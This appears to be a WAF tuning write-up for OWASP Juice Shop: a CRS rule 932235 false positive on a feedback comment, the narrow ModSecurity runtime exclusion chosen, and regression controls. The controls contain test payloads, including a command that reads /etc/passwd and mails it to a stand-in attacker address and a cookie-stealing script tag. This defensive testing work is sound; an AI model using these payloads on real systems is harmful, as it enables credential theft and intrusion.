# FP-001: A tracking link in a feedback comment, blocked as command injection

| | |
| --- | --- |
| Status | Fixed, regression tested |
| Route | `POST /api/Feedbacks/` (Juice Shop's "Customer Feedback" form) |
| Rule | CRS 932235, Unix command injection (command without evasion), CRITICAL |
| My fix | Runtime exclusion **1010** in `modsecurity/exclusions/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf` |
| Scenarios | `scenarios/false-positive/FP-001.yaml` |

## 1. The legit request

A customer spots a typo in a newsletter link and pastes the link into the feedback form:

```json
POST /api/Feedbacks/
{"comment": "The link https://example.com/?ref=juice&utm_source=mail in your newsletter has a typo",
 "rating": 4, "captchaId": 1, "captcha": "12"}
```

I found it by throwing about 40 realistic feedback comments at CRS PL1. This was the most natural one that a single rule blocked. The rest of my catch is at the bottom.

## 3. Why the rule fired

932235 hunts for prefix + known command + delimiter (see my [autopsy](../crs-rule-autopsies/932235.md)). In `utm_source=mail in`, the `=` is a shell assignment prefix, `mail` is a Unix command, and the space is a delimiter. Put `=mail ` in a shell parameter and it really can kick off an injection. In a customer's sentence? It's a URL.

## 4. What kind of problem is it?

| Question I asked | My answer |
| --- | --- |
| Wrong rule for this app? | No. Juice Shop has risks shaped like command injection elsewhere. |
| Right rule, wrong parameter? | **Yes.** `comment` is free text. It gets stored and displayed. Nothing executes it. |
| Right detection, wrong route? | Partly. Only the feedback route takes free text in `comment`. |
| Normalisation issue? | No. `t:none`, and the raw text matches. |
| Threshold issue? | No. One CRITICAL match. Raising the threshold switches off a pile of real detections (see my [anomaly scoring experiment](../anomaly-scoring-experiment.md)). |
| Should the app change? | No. |

## 5. My options

| Option | Effect | Verdict |
| --- | --- | --- |
| `SecRuleRemoveById 932235` | Rule gone for every argument, cookie and route | Way too broad |
| `SecRuleUpdateTargetById 932235 "!ARGS:comment"` (at configure time) | Rule ignores `comment` on **every** route | Broader than it needs to be |
| Threshold 5 → 10 | Fixes this, and lets every 5 point attack in | No |
| **Runtime exclusion: POST + `/api/Feedbacks` → `ctl:ruleRemoveTargetById=932235;ARGS:comment`** | One rule, one argument, one route | **This one** |

## 6. My change

```apache
SecRule REQUEST_METHOD "@streq POST" \
    "id:1010,phase:1,pass,nolog,t:none,ver:'wfr/FP-001',chain"
    SecRule REQUEST_FILENAME "@rx ^/api/feedbacks/?$" \
        "t:none,t:lowercase,ctl:ruleRemoveTargetById=932235;ARGS:comment"
```

It's a **runtime** exclusion, so it goes in the file that loads **before** CRS. `ctl:` changes how *later* rules treat *this* transaction. Phase 1 is plenty early, since 932235 runs in phase 2.

## 7. Evidence after my fix

![FP-001 after the fix, with its four controls](../screenshots/16-fp001-after.png)

| Scenario | Request | Result |
| --- | --- | --- |
| FP-001 | the same comment | **allowed**, HTTP 201, nothing matched ([`fp001-after-allowed.json`](../../evidence/sanitized-samples/fp001-after-allowed.json)) |
| FP-001-CTRL-1 | `nice; cat /etc/passwd \| mail attacker@example.test` in `comment` | **blocked** by 930120 + 932160, score 10 ([sample](../../evidence/sanitized-samples/fp001-after-ctrl1-cmdi-still-blocked.json)). Before my fix 932235 piled on too (score 15). Other rules still catch it. |
| FP-001-CTRL-2 | `<script>…document.cookie</script>` in `comment` | **blocked** by 941100, 941110, 941160, 941180, score 20 |
| FP-001-CTRL-3 | `=mail -s pwned` in another parameter | 932235 still matches |
| FP-001-CTRL-4 | the FP-001 comment sent to `/api/Complaints/` | **still blocked** by 932235. My exclusion only covers its own route |

All five run in CI on every push.

## 8. The trade off

On this one route, a command injection whose **only** tell is `<prefix><command><delimiter>` in `comment` no longer gets scored by 932235. Anything that also touches files, pipes or other command forms still gets caught (CTRL-1). And the app never passes this field to a shell. I'll take that deal.
